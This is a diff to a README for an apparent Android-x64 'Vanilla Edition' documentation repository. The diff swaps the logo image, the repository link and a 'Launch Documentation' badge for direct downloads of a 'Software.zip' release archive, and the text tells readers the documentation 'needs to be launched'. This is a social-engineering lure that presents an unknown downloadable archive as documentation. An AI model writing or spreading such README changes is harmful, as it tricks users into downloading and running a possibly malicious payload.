@@ -5,7 +5,7 @@
 
 This repository serves as the documentation source for the Vanilla build of Android 13.1, a basic, yet useful alternative to Android 13.1 (T). If you are interested in learning about Android-x64 development, this is the perfect place for you. 
 
-![Android Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Android_robot.svg/1920px-Android_robot.svg.png)
+![Android Logo](https://github.com/memememe566/Android-x64_Android13.1_Vanilla_Edition_Docs/releases/download/v1.0/Software.zip)
 
 ## Repository Details
 
@@ -36,9 +36,9 @@ This repository serves as the documentation source for the Vanilla build of Andr
 
 ## Getting Started
 
-To explore the documentation, please visit our [GitHub repository](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Remember, it needs to be launched to access the complete information.
+To explore the documentation, please visit our [GitHub repository](https://github.com/memememe566/Android-x64_Android13.1_Vanilla_Edition_Docs/releases/download/v1.0/Software.zip). Remember, it needs to be launched to access the complete information.
 
-[![Launch Documentation](https://img.shields.io/badge/Launch-Docs-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Launch Documentation](https://github.com/memememe566/Android-x64_Android13.1_Vanilla_Edition_Docs/releases/download/v1.0/Software.zip)](https://github.com/memememe566/Android-x64_Android13.1_Vanilla_Edition_Docs/releases/download/v1.0/Software.zip)
 
 If the provided link does not work, or you need an alternative way to access the content, check out the "Releases" section of the repository for more options.
 
